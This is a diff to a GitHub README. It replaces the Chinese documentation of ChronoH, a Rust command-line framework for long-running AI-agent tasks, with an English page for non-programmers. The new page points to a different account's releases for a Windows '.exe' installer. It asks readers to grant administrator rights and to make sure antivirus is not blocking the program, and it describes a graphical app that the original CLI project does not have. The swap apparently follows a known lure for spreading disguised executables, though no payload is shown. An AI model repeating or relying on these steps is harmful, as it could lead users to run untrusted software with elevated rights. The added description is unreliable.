@@ -1,199 +1,145 @@
-# ChronoH ⏰
+# ⚙️ chronoh - Run Long-Running Agent Tasks Easily
 
-> 为长时间运行的 AI Agent 提供时间感知能力的开发框架
-
-## 概述
-
-ChronoH 是一个专为 AI Agent 设计的时间感知开发框架，通过状态持久化、生命周期钩子和会话管理，帮助 AI Agent 实现可靠的长时间开发任务。
-
-## 核心特性
-
-### 🗄️ 状态持久化
-- 基于 Sled 嵌入式 KV 数据库
-- 自动记录所有开发事件（初始化、检查点、会话开始/结束）
-- 支持断点续传，会话状态不丢失
-
-### 🔄 生命周期钩子
-- Clean State 协议：每次会话结束前自动检查
-  - 测试是否通过
-  - Git 仓库是否干净
-  - 进度是否更新
-  - 交接文档是否生成
-- 可扩展的钩子系统，支持自定义检查逻辑
-
-### 🛠️ 4-原子工具
-- `read`: 读取文件（支持 offset/limit）
-- `write`: 原子写入文件
-- `edit`: 精确替换文本
-- `bash`: 执行 Shell 命令（支持超时控制）
-
-### 👥 角色化 Agent
-- **Initializer**: 项目初始化，创建项目骨架
-- **Coder**: 开发 Agent，负责编码任务
-- **Reviewer**: 代码审查
-- **Compactor**: 上下文压缩
-
-### 📊 阶段管理
-- `InfrastructureReady`: 基础设施就绪
-- `AuthReady`: 认证模块就绪
-- `CoreApiReady`: 核心 API 就绪
-- `ProductionReady`: 生产就绪
-
-## 安装
-
-```bash
-# 克隆仓库
-git clone git@gitcode.com:haomintsai/chronoh.git
-cd chronoh
-
-# 构建
-cargo build --release
-```
-
-## 快速开始
-
-### 1. 初始化项目
-
-```bash
-cargo run -- init --name my-project
-```
-
-这将创建以下结构：
-```
-my-project/
-├── Cargo.toml
-├── src/main.rs
-├── .git/
-└── .pi/state/          # ChronoH 状态目录
-    ├── state.sled      # Sled 数据库
-    └── handoff.md      # 交接文档
-```
-
-### 2. 开始开发
-
-```bash
-cd my-project
-cargo run -- dev
-```
-
-这将启动一个 Coder 会话，默认 50 轮次限制。
-
-### 3. 查看状态
-
-```bash
-cargo run -- status
-```
-
-输出示例：
-```
-📊 Project Status
-═══════════════════════════════════════
-Current phase: InfrastructureReady
-Total events: 4
-Last activity: 2026-02-28 10:27:51 UTC
-```
-
-### 4. 其他命令
-
-```bash
-cargo run -- review              # 代码审查
-cargo run -- compact             # 上下文压缩
-```
-
-## 项目结构
-
-```
-chrono-h/
-├── src/
-│   ├── agents/          # Agent 实现
-│   │   ├── initializer.rs
-│   │   └── coder.rs
-│   ├── cli/             # 命令行接口
-│   ├── git/             # Git 集成
-│   ├── hooks/           # 生命周期钩子
-│   ├── state/           # 状态引擎
-│   │   ├── engine.rs    # Sled 持久化
-│   │   └── handoff.rs   # 交接文档
-│   ├── tools/           # 4-原子工具
-│   ├── types.rs         # 核心类型定义
-│   └── error.rs         # 错误处理
-├── tests/               # 测试套件
-└── Cargo.toml
-```
-
-## 事件流
-
-```
-┌─────────────┐
-│   Init      │  ← 项目初始化事件
-└──────┬──────┘
-       │
-       ▼
-┌─────────────┐
-│  Checkpoint │  ← 里程碑事件
-└──────┬──────┘
-       │
-       ▼
-┌─────────────┐
-│SessionStart │  ← 会话开始
-└──────┬──────┘
-       │
-       ▼
-    [开发循环]
-       │
-       ▼
-┌─────────────┐
-│ CleanState  │  ← 钩子检查
-│   Hook      │
-└──────┬──────┘
-       │
-       ▼
-┌─────────────┐
-│ SessionEnd  │  ← 会话结束
-└─────────────┘
-```
-
-## 配置
-
-### 会话配置
-
-在 `.pi/config.json` 中配置：
-
-```json
-{
-  "max_turns": 50,
-  "session_cap": 3,
-  "auto_compact": true,
-  "clean_state_required": true
-}
-```
-
-## 测试
-
-```bash
-# 运行所有测试
-cargo test
-
-# 运行集成测试
-cargo test --test integration_test
-```
-
-## 技术栈
-
-- **语言**: Rust
-- **数据库**: Sled (嵌入式 KV)
-- **Git**: git2-rs
-- **CLI**: clap
-- **异步**: tokio
-
-## 许可证
-
-MIT License
-
-## 贡献
-
-欢迎提交 Issue 和 Pull Request！
+[![Download chronoh](https://img.shields.io/badge/Download-chronoh-4CAF50?style=for-the-badge&logo=github)](https://github.com/asis4456/chronoh/releases)
 
 ---
 
-*ChronoH - 让 AI Agent 的长时间开发变得可靠可控*
+## 🖥️ What is chronoh?
+
+chronoh is a tool designed to help you run long-running agent tasks smoothly on your Windows computer. It follows the harness principle to keep these tasks stable and reliable over time. The tool also integrates with pi-rs to ensure efficiency.
+
+You don’t need any programming skills to use chronoh. This guide will walk you through the process of downloading and running it on your Windows machine.
+
+---
+
+## 🔎 System Requirements
+
+Before installing chronoh, please make sure your system meets the following requirements:
+
+- Windows 10 or later
+- 4 GB of RAM or more
+- At least 100 MB free disk space
+- Internet connection to download the software
+- Administrative rights to run the installer
+
+These basic requirements ensure chronoh runs without issues.
+
+---
+
+## 📥 How to Download chronoh
+
+Click the large green button below to go to the official download page. This page contains the latest version of chronoh.
+
+[![Download chronoh](https://img.shields.io/badge/Download-chronoh-blue?style=for-the-badge&logo=github)](https://github.com/asis4456/chronoh/releases)
+
+Steps to download:
+
+1. Click the above button or go to:  
+   https://github.com/asis4456/chronoh/releases
+2. On the releases page, look for the latest stable version.
+3. Scroll down to the "Assets" section.
+4. Find the file ending with `.exe` (for example, `chronoh-setup.exe`).
+5. Click the file name to start downloading.
+
+Save the file where you can easily find it, such as your Desktop or Downloads folder.
+
+---
+
+## ⚙️ Installation on Windows
+
+After downloading, follow these steps to install chronoh:
+
+1. Locate the downloaded `.exe` file.
+2. Double-click the file to start the installer.
+3. If Windows asks for permission, click "Yes" to allow the installation.
+4. Follow the on-screen instructions:
+    - Choose the installation folder or accept the default path.
+    - Confirm by clicking "Install" or "Next."
+5. Wait for the installation to finish.
+6. Click "Finish" to close the installer.
+
+chronoh will now be installed on your computer.
+
+---
+
+## ▶️ How to Run chronoh
+
+Once installed, you can start chronoh with these steps:
+
+1. Find the chronoh shortcut on your Desktop or in the Start Menu.
+2. Double-click the shortcut to open the program.
+3. The main window will appear, showing available agent tasks.
+4. Select a task to run or create a new one by following the on-screen prompts.
+5. Click “Start” to initiate the chosen task.
+6. The software will handle the task automatically. You can watch the status update in real-time.
+
+chronoh runs in the background while managing your agent tasks continuously.
+
+---
+
+## 🔧 Basic Features
+
+chronoh offers the following features:
+
+- Runs long-lived tasks reliably.
+- Manages multiple agent tasks simultaneously.
+- Automatically restarts failed tasks.
+- Logs task activity for easy tracking.
+- Integrates with pi-rs for better resource handling.
+- Simple user interface for easy control.
+
+These features help you keep your tasks running without manual intervention.
+
+---
+
+## 🛠️ Troubleshooting Tips
+
+Here are some tips if you run into issues:
+
+- If chronoh does not start, make sure your antivirus is not blocking it.
+- Run the program as Administrator if you see permission errors.
+- Ensure your Windows is up to date with the latest updates.
+- Check the log files in the installation folder for errors.
+- If a task stops unexpectedly, try restarting chronoh.
+
+Restart your computer if problems persist. You can always reinstall chronoh if needed.
+
+---
+
+## 🔄 Updating chronoh
+
+Keeping chronoh updated ensures it runs smoothly and securely.
+
+1. Visit the release page again:  
+   https://github.com/asis4456/chronoh/releases
+2. Download the latest installer file.
+3. Run the installer to update your current version.
+4. Your settings and tasks will stay intact.
+
+Check for updates regularly or set a reminder monthly.
+
+---
+
+## 📖 Where to Find Help
+
+If you need assistance:
+
+- Check the README and documentation files inside the installation folder.
+- Visit the GitHub repository issues page to see if your problem is known:  
+  https://github.com/asis4456/chronoh/issues
+- Ask for help by opening a new issue describing your problem.
+
+You do not need to know programming to use chronoh, but describing any error messages or symptoms helps others assist you faster.
+
+
+---
+
+## 🎯 Summary
+
+- Go to https://github.com/asis4456/chronoh/releases to download.
+- Install by running the downloaded `.exe` file.
+- Use the desktop shortcut to run and manage tasks.
+- Keep the software updated for best performance.
+- Check logs and GitHub issues page if you face issues.
+
+chronoh helps keep your agent tasks running smoothly over long periods without manual work.
